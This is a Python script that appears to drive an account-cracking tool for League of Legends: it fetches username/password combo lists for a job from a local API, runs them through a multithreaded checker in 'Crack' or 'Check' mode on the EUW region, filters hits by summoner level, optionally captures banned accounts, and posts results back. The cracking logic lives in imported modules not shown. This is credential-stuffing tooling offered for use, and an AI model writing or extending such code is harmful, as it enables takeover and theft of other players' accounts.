from argparse import ArgumentParser
import re

from requests.api import head
from common.enumAction import EnumAction
from common.crackMode import CrackMode
from common.gameData import GameData
from common.region import Region
from common.crackResult import CrackResult
from common.proxy import Proxy
from common.combo import Combo
from common.checker import Checker
from config import config

import requests
import threading, queue


parser = ArgumentParser()
parser.add_argument("--job", help="The job ID to process.", required=True, type=int)
parser.add_argument(
    "--threads", help="The amount of threads to run.", required=True, type=int
)
parser.add_argument(
    "--mode",
    help="The checking mode. Crack/Check",
    default=CrackMode.CHECK,
    type=CrackMode,
    action=EnumAction,
)
parser.add_argument(
    "--min-level",
    help="The minimum summoner level required to yield a successful result.",
    default=30,
    type=int,
)
parser.add_argument(
    "--capture-bans", help="Capture banned accounts", action="store_true"
)
args = parser.parse_args()

game_data = GameData()

q = queue.Queue()

response = requests.get(
    f"http://localhost:3001/api/jobs/{args.job}/combos",
    headers={"Authorization": f"Bearer {config['root_token']}"},
)

combos = response.json()


def worker():
    while True:
        item = q.get()
        result = CrackResult.RETRY
        while result == CrackResult.RETRY:
            try:
                checker = Checker(
                    Region.EUW,
                    Combo(item["id"], item["username"], item["password"]),
                    game_data,
                    args.mode,
                    args.min_level,
                    args.capture_bans,
                )
                result = checker.check()
                if result != CrackResult.RETRY:
                    checker.log(result.name)
                if result != CrackResult.RETRY and result != CrackResult.SUCCESS:
                    payload = {"result": "Failed"}
                    requests.post(
                        f"http://localhost:3001/api/jobs/results/{item['id']}",
                        headers={"Authorization": f"Bearer {config['root_token']}"},
                        json=payload,
                    )
            except Exception as e:
                print(e)
        q.task_done()


for combo in combos:
    q.put(combo)

for item in range(args.threads):
    threading.Thread(target=worker, daemon=True).start()


q.join()
requests.post(
    f"http://localhost:3001/api/jobs/{args.job}/complete",
    headers={"Authorization": f"Bearer {config['root_token']}"},
)
print("All work completed")
